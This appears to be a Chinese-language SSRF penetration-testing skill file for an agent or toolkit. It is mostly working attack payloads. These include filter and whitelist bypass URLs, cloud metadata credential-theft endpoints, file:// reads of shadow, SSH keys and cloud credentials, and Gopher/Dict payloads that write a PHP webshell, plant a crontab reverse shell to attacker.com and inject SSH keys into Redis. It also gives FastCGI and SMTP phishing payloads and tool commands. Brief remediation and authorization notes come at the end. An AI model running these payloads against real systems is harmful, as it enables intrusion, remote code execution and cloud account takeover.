---
name: ssrf-testing
description: SSRF服务器端请求伪造深度测试技能：内网渗透全协议攻击面、云元数据、Gopher/Dict全协议利用、WAF绕过、Redis/FastCGI/Memcached RCE利用链
version: 2.0.0
---

# SSRF服务器端请求伪造深度测试技能

## 概述

SSRF（Server-Side Request Forgery）利用服务器发起恶意请求，可访问内网资源、扫描端口、读取本地文件、攻击内网服务，甚至通过特定协议实现RCE。现代防护通过URL白名单、DNS解析验证、IP黑名单、协议限制等多层防御。本技能覆盖全协议（http/https/file/gopher/dict/ftp/ldap/tftp）、全攻击面（云元数据/内网服务/本地文件）、绕过方法（DNS重绑定/IP编码/302跳转/短链接/IPV6），以及Redis/FastCGI/Memcached等服务的完整RCE利用链。

## 一、SSRF完整攻击面

### 1.1 SSRF触发点
| 功能/参数 | 说明 |
|---------|------|
| URL预览/分享 | `?url=http://xxx`、`?link=xxx` |
| 网页截图/转PDF | `?src=http://xxx`、wkhtmltopdf/PhantomJS |
| 文件上传（远程URL）| `?remote_url=http://xxx/image.jpg` |
| Webhook/回调 | 支付回调、消息通知Webhook URL |
| API代理/转发 | 后端代理请求外部API |
| 数据导入 | `import?url=http://xxx/data.xml` |
| 图片处理 | 远程图片拉取、缩略图生成 |
| PDF生成 | wkhtmltopdf加载远程资源 |
| oEmbed/OpenGraph | 社交分享预览 |
| 远程头像/封面 | 通过URL拉取头像 |
| RSS/ATOM订阅 | RSS源URL |
| Trackback/Pingback | WordPress/Trackback |
| 健康检查/监控 | URL连通性检测 |
| 文件格式转换 | pandoc/ffmpeg拉取远程文件 |
| 验证码服务 | 远程验证码图片拉取 |
| 下载功能 | `?file_url=http://xxx` |
| OCR/图片识别 | 远程图片URL |
| 翻译服务 | 翻译远程网页 |
| DNS查询/域名验证 | 域名所有权验证 |

### 1.2 协议支持
| 协议 | 端口/利用 | 支持情况 |
|------|---------|---------|
| `http://` / `https://` | 80/443，内网Web、云元数据 | 几乎所有语言/库支持 |
| `file:///` | 本地文件读取 | PHP/cURL支持、Java支持、.NET部分支持 |
| `gopher://` | 任意TCP协议构造（Redis/FastCGI/MySQL等）| PHP/cURL、部分语言库 |
| `dict://` | 端口探测、发送TCP命令 | PHP/cURL |
| `ftp://` | FTP访问、匿名FTP | 多数支持 |
| `ldap://` / `ldaps://` | LDAP注入、信息泄露 | Java/PHP |
| `tftp://` | UDP文件传输（UDP SSRF）| 部分支持 |
| `ssh2://` | SSH连接（需认证）| PHP |
| `telnet://` | TCP原始通信 | PHP/cURL |
| `jar://` | Java解压读取文件 | Java（ZIP Slip）|
| `netdoc://` | Java本地文件读取 | Java旧版本 |
| `php://` | PHP流包装器 | PHP |
| `data://` / `data:text/html` | 内联数据 | 多数支持 |
| `glob://` | 文件查找 | PHP |
| `expect://` | 命令执行（需expect扩展）| PHP |
| `ogg://` | 音频流 | PHP |
| `zlib://` / `zip://` | 压缩包文件读取 | PHP |
| `phar://` | PHP反序列化触发 | PHP |

### 1.3 漏洞危害等级
```
Level 1: 内网端口/服务探测（端口扫描、服务识别）
Level 2: 本地文件读取（file://协议）
Level 3: 云元数据访问（AWS/GCP/Azure/阿里云AK/SK窃取）
Level 4: 内网未授权服务访问（Redis/Memcached/Elasticsearch）
Level 5: 内网Web漏洞利用（Struts2/WebLogic/Jenkins未授权）
Level 6: 协议级RCE（Gopher→Redis/FastCGI RCE）
Level 7: 内网横向移动（SMB哈希捕获/NTLM Relay）
Level 8: 云环境容器逃逸/元数据命令执行
```

## 二、SSRF检测与分类

### 2.1 回显差异判断
- **完全回显**：响应内容直接返回目标URL的响应内容（最理想）
- **部分回显**：只返回标题/状态码/Content-Type
- **无回显（Blind SSRF）**：只知道请求是否成功，通过DNS/HTTP外带判断
- **时间差异**：通过响应时间差异判断端口开放（开放端口响应快，关闭端口超时）

### 2.2 基础探测Payload
```
# 回环/本地探测
http://127.0.0.1
http://127.0.0.1:80
http://localhost
http://0.0.0.0
http://[::1]
http://0

# 本地文件
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/cmdline
file:///proc/self/environ
file:///etc/shadow
file:///var/www/html/config.php
file:///etc/nginx/nginx.conf
file:///etc/hosts

# 内网IP段
http://10.0.0.1
http://172.16.0.1
http://192.168.0.1
http://169.254.169.254    （云元数据）
```

### 2.3 回显内容特征识别
| 响应内容 | 识别目标 |
|---------|---------|
| `root:x:0:0:` | file:///etc/passwd读取成功 |
| `#`号开头 | /etc/hosts |
| `AMI-`/`i-`/AKIA开头 | AWS元数据 |
| Redis版本/`-ERR` | Redis未授权 |
| `<!DOCTYPE html>` + 后台标题 | 内网Web应用 |
| `HTTP/1.1 401 Unauthorized` | 需认证服务 |
| `SSH-2.0` | SSH服务 |
| `MySQL|` / `nysql`乱码 | MySQL服务 |
| `+PONG` / `+OK` | Redis |
| `VERSION` / `STORED` | Memcached |
| `HTTP/1.1 200` + `{"status":"green"}` | Elasticsearch |

## 三、IP与URL绕过技术

### 3.1 IP地址编码绕过
```
# 127.0.0.1的各种编码形式

# 十进制整数
http://2130706433            （0x7f000001的十进制=2130706433）
http://0177.0.0.1            （八进制）
http://0x7f.0x0.0x0.0x1      （十六进制）
http://0x7f000001            （十六进制整数）

# 混合编码
http://0x7f.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]   （IPv6映射IPv4）
http://[::ffff:127.0.0.1]
http://0:0:0:0:0:ffff:7f00:1/128
http://[::1]

# 数字点分（少点变体）
http://127.1                   （=127.0.0.1）
http://127.0.1
http://127.0.0.0x1

# 特殊写法
http://0
http://0.0.0.0
http://127.1
http://127.0.0.1.
http://127.0.0.1:80
http://[::1]:80
```

### 3.2 DNS重绑定绕过
利用DNS TTL短时间变换IP，WAF校验时解析到合法IP，服务器实际请求时解析到内网IP。
```
# 工具
https://lock.cmpxchg8b.com/rebinder.html

# 原理
DNS查询1 → 返回公网IP 1.2.3.4（通过WAF检查）
DNS查询2（极短TTL后） → 返回127.0.0.1（服务器实际请求）

# 使用
http://7f000001.0a000001.rbndr.us （rbndr.us是公共DNS重绑定服务）
http://A.127.0.0.1.1time.127.0.0.1.forever.3d.3103a6b1.0302b45a.rbndr.us
```

### 3.3 DNS解析绕过
```
# 利用域名指向127.0.0.1
http://spoofed.burpcollaborator.net   （Burp Collaborator指向内部？不）
http://127.0.0.1.nip.io              （nip.io：127.0.0.1.nip.io → 127.0.0.1）
http://app.127.0.0.1.nip.io
http://customer1.app.10.0.0.1.nip.io
http://192.168.1.100.xip.io          （xip.io同理）
http://localtest.me                  （指向127.0.0.1）
http://customer1.localhost.me        （指向127.0.0.1）
http://127.0.0.1.nip.io:8080
http://[::1].nip.io
http://sm.aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.127.0.0.1.nip.io  （超长前缀绕过正则）

# 自建DNS解析
# 在attacker.com设置A记录指向127.0.0.1
http://internal.attacker.com    （自有域名解析到内网IP）

# DNS ToC/ToU绕过（Time-of-Check vs Time-of-Use）
# 与DNS重绑定类似，利用检查和使用时的DNS解析结果不同
```

### 3.4 302跳转绕过
若后端只校验首次URL，通过302跳转到内网地址。
```
# 思路：在自己服务器上配置302重定向
# http://attacker.com/redirect → 302 Location: http://127.0.0.1/

# PHP 302跳转：
<?php header("Location: http://127.0.0.1/"); ?>

# 短链接服务
http://bit.ly/xxx    （短链接指向内网，若短链接服务在白名单）
http://t.cn/xxx

# 利用已知开放跳转漏洞
# 若同域存在open redirect，绕过同源SSRF限制
https://target.com/redirect?url=http://127.0.0.1/

# Gopher重定向
# http://attacker.com/302.php → 302到 gopher://127.0.0.1:6379/_...
```

### 3.5 协议解析差异绕过
```
# @符号URL解析差异
http://attacker.com@127.0.0.1/        （部分解析器认为attacker.com是用户名，实际访问127.0.0.1）
http://attacker.com#@127.0.0.1/       （#后为fragment，部分解析不同）
http://127.0.0.1%00@attacker.com      （空字节截断）
http://attacker.com%00@127.0.0.1

# URL编码/混淆
http://127.0.0.1%0a.attacker.com
http://127.0.0.1\t.attacker.com
http://127.0.0.1\n.attacker.com
http://127.0.0.1%09.attacker.com
http://127.0.0.1.attacker.com

# 反斜杠差异
http://127.0.0.1\attacker.com
http://attacker.com\@127.0.0.1

# 多斜杠
http:////127.0.0.1
http://///127.0.0.1
http:///\\127.0.0.1
http://127.0.0.1/..

# 句号欺骗
http://127。0。0。1      （中文句号→某些解析器自动转换）
http://127．0．0．1
```

### 3.6 白名单域名绕过
```
# 子域名
http://127.0.0.1.attacker.com           （DNS解析：attacker.com的子域）
http://127.0.0.1.xip.io                 （xip.io通配）

# 域名匹配绕过
# 白名单包含target.com
http://target.com.attacker.com           （前缀加后缀，不属于target.com）
http://attacker.com?target.com           （参数里包含白名单）
http://attacker.com#target.com
http://target.com@attacker.com           （@符号实际访问attacker.com）

# 利用URL解析器差异
# Java URI解析与HTTP client不同
new URI("http://attacker.com#@127.0.0.1") → host=attacker.com
HTTP client实际请求→ http://attacker.com#@127.0.0.1 → 浏览器忽略#fragment但某些HTTP库不会
```

### 3.7 进制/特殊编码
```
# 八进制
http://0177.0.0.1
http://0177.0.0.01
http://0177.00.00.01
http://017700000001

# 十六进制
http://0x7f.0x0.0x0.0x1
http://0x7f000001

# 混合编码
http://0x7f.0.0.1
http://127.0x0.0.0x1
http://0177.0.0x1

# URL编码
http://%31%32%37%2e%30%2e%30%2e%31       (=127.0.0.1)
http://127.0.0.1%2f%2f
http://127.0.0.1%3a80

# 双重URL编码
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531
```

### 3.8 IPv6绕过
```
http://[::1]                              （IPv6回环）
http://[::ffff:127.0.0.1]                （IPv4映射IPv6）
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0000::1]
http://[::]
http://[::1]:80

# 内网IPv6
http://[fd00::1]                           （ULA内网地址）
http://[fe80::1]                           （链路本地）
```

### 3.9 非常规组合绕过
```
# 利用redirect chain
# 短链接→302→内网IP
http://t.cn/xxxx → 302 → http://127.0.0.1/

# 利用非HTTP协议端口
http://127.0.0.1:22                        （探测SSH）
http://127.0.0.1:3306                      （MySQL）
http://127.0.0.1:6379                      （Redis）
http://127.0.0.1:8080
http://127.0.0.1:9000                      （FastCGI）

# 非ASCII字符
http://127.0.0.1。        （中文句号→某些库转换为.）
http://127%E3%80%820%E3%80%820%E3%80%821
```

## 四、云元数据攻击

### 4.1 AWS
```
# AWS实例元数据（IMDSv1）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[RoleName]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2（需先获取token）
# PUT http://169.254.169.254/latest/api/token （X-aws-ec2-metadata-token-ttl-seconds: 21600）
# GET http://169.254.169.254/latest/meta-data/ （X-aws-ec2-metadata-token: <token>）

# AWS ECS
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# AWS EKS Pod身份
http://169.254.170.23/

# AWS Lambda
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

### 4.2 Google Cloud (GCP)
```
# GCP元数据（需Metadata-Flavor: Google头）
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/
# 必须带Header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### 4.3 Microsoft Azure
```
# Azure元数据（需Metadata: true头）
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header: Metadata: true
```

### 4.4 阿里云
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/user-data

# 阿里云ECS RAM角色
http://100.100.100.200/latest/meta-data/ram/security-credentials/[RoleName]
# 返回AccessKeyId/AccessKeySecret/SecurityToken
```

### 4.5 腾讯云
```
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/placement/region
http://metadata.tencentyun.com/latest/meta-data/local-ipv4
```

### 4.6 华为云
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/openstack/latest/meta_data.json
```

### 4.7 其他云/平台
```
# Kubernetes API Server
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
https://kubernetes.default.svc/
https://kubernetes/
# Service Account Token
/var/run/secrets/kubernetes.io/serviceaccount/token

# Docker API
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/containers/create
http://127.0.0.1:2376/   （TLS Docker）

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
```

## 五、协议级高级利用

### 5.1 Gopher协议（最强大）
Gopher协议可以构造任意TCP数据流，是SSRF RCE的核心协议。

**Gopher协议格式：**
```
gopher://host:port/_[TCP数据流，%0d%0a分隔]
```
注意：`_`后的数据会被发送，换行符需URL编码为`%0d%0a`

**Redis未授权访问RCE：**
```
# 1. 写WebShell
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20payload%20%22%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%22%0d%0aSAVE%0d%0aQUIT%0d%0a

# 2. 写Crontab反弹Shell
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20payload%20%22%5Cn%5Cn%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261%5Cn%5Cn%22%0d%0aSAVE%0d%0aQUIT%0d%0a

# 3. 写SSH公钥
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0d%0aCONFIG%20SET%20dbfilename%20authorized_keys%0d%0aSET%20payload%20%22%5Cn%5Cnssh-rsa%20AAAAB3NzaC1yc...%20attacker%40local%5Cn%5Cn%22%0d%0aSAVE%0d%0aQUIT%0d%0a

# 4. 主从复制RCE（Redis 4.x/5.x）
gopher://127.0.0.1:6379/_SLAVEOF attacker.com 6379%0d%0aCONFIG SET dbfilename exp.so%0d%0aREPLCONF DBFNAME exp.so%0d%0aMODULE LOAD ./exp.so%0d%0aSLAVEOF NO ONE%0d%0aSYSTEM.EXEC 'whoami'%0d%0a
```

**FastCGI（PHP-FPM 9000端口）RCE：**
```
# 构造FastCGI协议包，执行任意PHP代码
# 使用gopherus工具生成
python gopherus.py --exploit fastcgi

# 关键步骤：
# 1. 构造FastCGI_PARAMS
# 2. 设置SCRIPT_FILENAME为可访问PHP文件
# 3. 通过PHP_ADMIN_VALUE设置auto_prepend_file=php://input
# 4. POST body为PHP代码
# 5. Gopher协议封装
gopher://127.0.0.1:9000/_%01%01...（完整FastCGI二进制包）
```

**MySQL协议利用：**
```
# 构造MySQL认证包 + SQL查询
gopher://127.0.0.1:3306/_...（MySQL协议包）
# 可用于：
# - 读取MySQL密码hash
# - 写WebShell（需FILE权限+secure_file_priv为空）
# - 利用UDF提权
```

**Memcached未授权：**
```
# Memcached命令执行（通过Gopher发送set命令）
gopher://127.0.0.1:11211/_set%20key%200%200%204%0d%0aTEST%0d%0a
# 通过Memcached注入SSRF/RCE（SSRF→Memcached→SRCache等）
# 配合其他服务利用
```

**SMTP邮件发送：**
```
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM%3A%3Ca%40a.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aFrom%3A%20admin%40target.com%0d%0aSubject%3A%20Reset%0d%0a%0d%0aClick%20http%3A//attacker.com/%0d%0a.%0d%0aQUIT%0d%0a
```

### 5.2 Dict协议
```
# 端口探测
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:3306/INFO

# Redis命令执行
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20x%20%22%3C%3Fphp%20eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%22
dict://127.0.0.1:6379/SAVE
```

### 5.3 File协议深度利用
```
# Linux系统文件
file:///etc/passwd
file:///etc/shadow                            （需root）
file:///etc/hosts
file:///etc/hostname
file:///proc/self/cmdline                     （当前进程命令行）
file:///proc/self/environ                     （环境变量，可能含密钥）
file:///proc/self/exe                         （进程二进制）
file:///proc/self/fd/                         （打开的文件描述符）
file:///proc/version                          （内核版本）
file:///proc/net/tcp                          （TCP连接）
file:///proc/net/fib_trie                     （路由表，发现内网段）
file:///proc/sched_debug                      （进程信息）
file:///root/.ssh/id_rsa                      （SSH私钥）
file:///root/.bash_history                    （命令历史）
file:///var/log/apache2/access.log            （Apache日志）
file:///var/log/nginx/access.log              （Nginx日志）
file:///var/www/html/.env                     （环境变量，数据库密码）
file:///var/www/html/wp-config.php            （WordPress配置）
file:///var/www/html/config.php               （配置文件）
file:///var/www/html/application/config/database.php
file:///etc/nginx/nginx.conf                  （Nginx配置）
file:///etc/httpd/conf/httpd.conf             （Apache配置）
file:///etc/php/7.x/apache2/php.ini           （PHP配置）
file:///etc/mysql/my.cnf                      （MySQL配置）
file:///etc/sysconfig/network-scripts/ifcfg-eth0  （网卡配置）

# Windows系统文件
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/win.ini
file:///C:/Windows/System32/config/SAM         （SAM数据库，需权限）
file:///C:/inetpub/wwwroot/web.config          （IIS配置）
file:///C:/Users/Administrator/NTUser.dat
file:///C:/Windows/debug/Passwd.log
file:///C:/Windows/Panther/Unattend/Unattended.xml  （Unattend安装密码）
file:///C:/Users/Administrator/.ssh/id_rsa
file:///C:/xampp/phpmyadmin/config.inc.php
file:///C:/phpStudy/WWW/config.php
file:///C:/wamp/www/config.ini.php

# 应用配置文件
file:///root/.aws/credentials                  （AWS凭证）
file:///root/.gcloud/access_tokens.db          （GCP凭证）
file:///root/.kube/config                      （Kubernetes config）
file:///var/lib/jenkins/credentials.xml        （Jenkins凭证）
file:///root/.m2/settings.xml                  （Maven配置含密码）
file:///root/.bashrc
file:///root/.git-credentials                  （Git凭证）
```

### 5.4 PHP流包装器
```
# php://filter读取文件源码（Base64编码避免执行）
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=index.php

# php://input POST数据执行
php://input  （POST body为PHP代码）

# data://伪协议
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
data:text/html,<script>alert(1)</script>

# phar://触发反序列化
phar:///path/to/uploaded.phar/somefile.txt
# 触发Phar反序列化，配合pop chain RCE

# zip://
zip:///path/to/file.zip%23shell.php            （#编码为%23）
```

### 5.5 Java特有协议
```
# jar://读取文件
jar:http://attacker.com/file.zip!/file.txt
jar:file:/path/to/file.zip!/file.txt
jar:https://attacker.com/file.jar!/META-INF/spring.factories

# netdoc://（Java本地文件）
netdoc:///etc/passwd

# Java URLClassLoader RCE
# 通过URL加载恶意JAR文件执行
```

## 六、内网Web攻击利用

### 6.1 内网常见脆弱服务
| 服务 | 端口 | 利用 |
|------|------|------|
| Redis | 6379 | 未授权→RCE（Gopher/Dict）|
| Memcached | 11211 | 未授权访问 |
| Elasticsearch | 9200/9300 | 未授权数据泄露/RCE（CVE）|
| MongoDB | 27017 | 未授权数据访问 |
| MySQL | 3306 | 弱口令/日志写Shell |
| MSSQL | 1433 | 弱口令/xp_cmdshell |
| PostgreSQL | 5432 | 弱口令/CVE |
| FastCGI/PHP-FPM | 9000 | 任意代码执行（Gopher）|
| Tomcat | 8080 | 弱口令管理后台→WAR部署 |
| JBoss | 8080 | JMXInvoker未授权RCE |
| WebLogic | 7001 | 多RCE CVE |
| Jenkins | 8080 | Groovy脚本控制台未授权RCE |
| Docker API | 2375 | 容器创建→逃逸 |
| ZooKeeper | 2181 | 未授权信息泄露 |
| ActiveMQ | 61616 | 反序列化RCE |
| RabbitMQ | 15672/5672 | 管理后台弱口令 |
| etcd | 2379 | 未授权K/V访问 |
| Consul | 8500 | API RCE |
| Nacos | 8848 | 弱口令→配置泄露 |
| Apache Solr | 8983 | RCE CVE |
| CouchDB | 5984 | 未授权访问 |
| Hadoop | 50070 | 未授权RCE |
| Dubbo | 20880 | 反序列化RCE |
| Shiro | 80/443 | RememberMe反序列化 |
| Spring Boot Actuator | 80/8080 | Actuator端点→RCE |
| Struts2 | 80/443 | OGNL注入RCE |

### 6.2 内网Web未授权利用
```
# Tomcat Manager
http://127.0.0.1:8080/manager/html
# 默认凭证tomcat/tomcat、admin/admin
# 可部署WAR包拿Shell

# WebLogic Console
http://127.0.0.1:7001/console/
http://127.0.0.1:7001/uddiexplorer/    （SSRF CVE-2014-4210）
# 默认凭证weblogic/Oracle@123

# JBoss
http://127.0.0.1:8080/jmx-console/
http://127.0.0.1:8080/web-console/
http://127.0.0.1:8080/invoker/JMXInvokerServlet    （反序列化RCE）

# Jenkins
http://127.0.0.1:8080/script
# Groovy脚本执行RCE

# Spring Boot Actuator
http://127.0.0.1:8080/actuator
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:8080/actuator/jolokia     （JNDI注入RCE）
http://127.0.0.1:8080/actuator/heapdump    （堆内存dump泄露密钥）
http://127.0.0.1:8080/env
http://127.0.0.1:8080/eureka/apps

# Apache Solr
http://127.0.0.1:8983/solr/
# RCE via Velocity模板

# Nacos
http://127.0.0.1:8848/nacos/v1/auth/login
# 默认凭证nacos/nacos
http://127.0.0.1:8848/nacos/v1/cs/configs  （配置信息含AK/SK）
```

## 七、Blind SSRF利用

### 7.1 DNS外带数据
```
# 利用DNS查询外带数据（所有HTTP客户端都会触发DNS查询）
http://127.0.0.1:80.attacker-controlled-dns.com
# 使用Burp Collaborator/DNSLog/Interactsh
http://xxx.burpcollaborator.net
http://xxx.interact.sh
http://xxx.dnslog.cn

# 构造子域包含数据（需要DNS支持长域名）
http://$(whoami).attacker.com
http://portscan-22-open.attacker.com
# 通过DNS子域名编码端口扫描结果、文件内容等
```

### 7.2 HTTP外带
```
# 通过HTTP请求将数据带出
http://attacker.com/?data=xxx
# 若响应会返回target的部分内容，可做外带
```

### 7.3 端口扫描技巧
```
# 时间端口扫描
# 开放端口：TCP连接快，响应快
# 关闭端口：连接被拒，快
# 防火墙过滤：超时，慢
# 通过响应时间判断端口状态

# 端口开放的HTTP服务可通过响应内容判断
http://127.0.0.1:22    → SSH-2.0 banner
http://127.0.0.1:3306  → MySQL版本信息
http://127.0.0.1:6379  → -ERR或+PONG
```

### 7.4 跨协议攻击
```
# 利用HTTP请求攻击非HTTP协议（CRLF注入）
# HTTP请求末尾的CRLF可以在某些协议中注入命令
http://127.0.0.1:25/?cmd=HELO%0d%0aMAIL FROM...

# 利用gopher攻击任何TCP协议（见5.1节）
```

## 八、WAF绕过与高级技巧

### 8.1 协议白名单绕过
```
# 目标只允许http/https协议？
# 尝试重定向到其他协议
http://attacker.com/302.php → 302 → gopher://...
# 某些HTTP客户端跟随重定向时不限制协议

# DNS重绑定到file://
http://rebind-attacker.com → 第一次解析为attacker.com，第二次为file://？不可能
# 实际只能通过302跳转绕过协议限制
```

### 8.2 DNS rebinding平台
```
# 工具
- https://lock.cmpxchg8b.com/rebinder.html
- https://github.com/nccgroup/singularity
- https://github.com/taviso/rbndr
```

### 8.3 内网IP段探测扩展
```
# 常见内网段
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
169.254.0.0/16（云元数据）
100.64.0.0/10（运营商级NAT/云VPC）
0.0.0.0/8
localhost.localdomain

# Docker默认
172.17.0.0/16

# Kubernetes Service
10.96.0.0/12

# 元数据
169.254.169.254
100.100.100.200（阿里云）
metadata.google.internal（GCP）
metadata.tencentyun.com（腾讯云）
```

### 8.4 参数污染（HPP）
```
?url=http://safe.com&url=http://127.0.0.1
?url=http://safe.com?next=http://127.0.0.1
```

### 8.5 文件包含配合SSRF
```
# 若后端会curl后include结果
# php://filter + SSRF
?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/
```

### 8.6 POST请求SSRF
```
# 许多SSRF点是POST参数
# 尝试GET/POST转换
# 修改Content-Type: application/json
{"url":"http://127.0.0.1/"}
```

### 8.7 Header注入触发SSRF
```
# 通过X-Forwarded-For/Host等头注入
X-Forwarded-For: 127.0.0.1
Host: internal-service
# 某些应用会请求Host头对应的地址
```

## 九、工具链

### 9.1 辅助工具
| 工具 | 用途 |
|------|------|
| Gopherus | 生成Gopher协议Payload（Redis/FastCGI/Memcached等）|
| SSRFmap | SSRF自动化扫描利用 |
| Burp Collaborator | DNS/HTTP外带接收 |
| Interactsh | 开源OOB外带平台 |
| DNSLog.cn | DNS外带平台 |
| Singularity | DNS重绑定攻击框架 |
| rbndr | DNS重绑定公共服务 |
| xip.io / nip.io | 通配DNS指向任意IP |
| ffuf/gobuster | 内网目录/端口fuzz |

### 9.2 Gopherus使用
```bash
# Redis RCE
python gopherus.py --exploit redis

# FastCGI RCE
python gopherus.py --exploit fastcgi

# MySQL
python gopherus.py --exploit mysql

# Zabbix
python gopherus.py --exploit zabbix

# Apache Tomcat
python gopherus.py --exploit tomcat

# Jenkins
python gopherus.py --exploit jenkins-clI

# SMTP发送邮件
python gopherus.py --exploit smtp

# Memcached
python gopherus.py --exploit memcache

# 生成的Gopher payload需要二次URL编码（某些环境需要）
```

### 9.3 SSRFmap使用
```bash
python ssrfmap.py -r request.txt -p url -m readfiles
python ssrfmap.py -r request.txt -p url -m portscan
python ssrfmap.py -r request.txt -p url -m redis
python ssrfmap.py -r request.txt -p url -m github_workers
python ssrfmap.py -r request.txt -p url -m zabbix
python ssrfmap.py -r request.txt -p url -m aliyun
python ssrfmap.py -r request.txt -p url -m aws
python ssrfmap.py -r request.txt -p url -m fastcgi
```

### 9.4 端口扫描脚本
```python
import requests
for port in [22,80,443,3306,6379,8080,9000,11211,27017]:
    try:
        r = requests.get(f"http://target.com/ssrf?url=http://127.0.0.1:{port}", timeout=3)
        print(f"Port {port}: {r.status_code} - {len(r.content)} bytes")
    except:
        print(f"Port {port}: closed/filtered")
```

## 十、SSRF测试清单

- [ ] 所有URL参数（url/link/src/href/file/remote/img/page等）
- [ ] 所有POST JSON/表单字段（URL字段）
- [ ] HTTP头（X-Forwarded-For/Host/Referer/X-Forwarded-Host）
- [ ] 协议探测（http/https/file/gopher/dict/php/data等）
- [ ] 本地回环（127.0.0.1/localhost/0/0.0.0.0/[::1]）
- [ ] IP编码绕过（十进制/八进制/十六进制/IPv6/混合）
- [ ] DNS重绑定测试
- [ ] 302跳转绕过
- [ ] @符号URL解析差异
- [ ] 云元数据探测（AWS/GCP/Azure/阿里云/腾讯云）
- [ ] 本地文件读取（/etc/passwd、Windows hosts、配置文件）
- [ ] 内网端口扫描（常见端口）
- [ ] 内网Web服务探测（Tomcat/WebLogic/Jenkins等）
- [ ] Gopher协议利用（Redis/FastCGI/MySQL）
- [ ] Dict协议利用
- [ ] PHP流包装器（php://filter/phar://）
- [ ] Blind SSRF DNS/HTTP外带
- [ ] 白名单域名绕过（xip.io/子域名/@符号）
- [ ] 非HTTP协议端口探测（SSH/Redis/MySQL banner）
- [ ] CRLF注入
- [ ] Docker/Kubernetes API探测
- [ ] 凭证文件（.ssh/.aws/配置文件）

## 十一、修复建议

- **协议白名单**：只允许http/https协议，禁止file/gopher/dict等
- **DNS解析验证**：解析域名后验证IP不在内网/回环/链路本地段
- **禁止重定向**：或限制重定向目标为公网地址
- **URL解析一致性**：使用可靠的URL解析库，避免解析差异
- **禁用非HTTP端口**：只允许80/443端口
- **最小化权限**：以低权限用户运行，不能访问元数据服务
- **网络隔离**：Web服务器不能访问元数据IP（iptables阻断169.254.169.254）
- **禁止30x跟随**：或对跳转目标做同样的URL校验
- **统一URL解析**：后端和WAF使用相同的URL解析逻辑
- **云环境加固**：
  - AWS使用IMDSv2（需PUT获取token）
  - 使用VPC Endpoint Policies限制元数据访问
  - 配置实例角色最小权限
- **超时限制**：设置短请求超时，避免长时间内网探测

## 注意事项

- **仅限授权测试**：SSRF可访问内网敏感资源，必须取得书面授权
- **避免DoS**：端口扫描时注意速率，避免对内网服务造成影响
- **云元数据敏感**：获得AK/SK可接管云账户，测试时立即报告并配合客户修复
- **内网扩散风险**：SSRF是内网渗透的入口点，测试边界需明确
- **协议限制**：file/gopher等协议依赖后端HTTP库，需逐一测试
- **Blind SSRF需耐心**：使用DNS外带、时间差异等方式验证
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
- **记录所有请求**：SSRF测试可能触发目标内网告警，需留痕备查

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
